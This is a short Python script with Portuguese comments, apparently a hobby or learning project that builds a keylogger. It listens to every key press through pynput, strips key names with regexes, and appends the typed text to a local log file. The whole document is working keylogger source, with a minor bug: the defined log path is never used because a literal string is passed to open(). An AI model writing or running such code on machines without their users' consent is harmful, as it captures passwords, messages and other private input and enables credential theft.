from pynput.keyboard import Listener
import re

arquivoLog = "Projeto de um Keylogger/arquivo.txt" #Definindo arquivo do Log.

def capturar(tecla):
    tecla = str(tecla)
    tecla  = re.sub(r'\'', '', tecla) #Fazendo o uso de Regex para tratar as imperfeições.
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)
    with open("arquivoLog", "a") as log:
        log.write(tecla)




with Listener(on_press=capturar) as l: #Configurando o Listener
    l.join()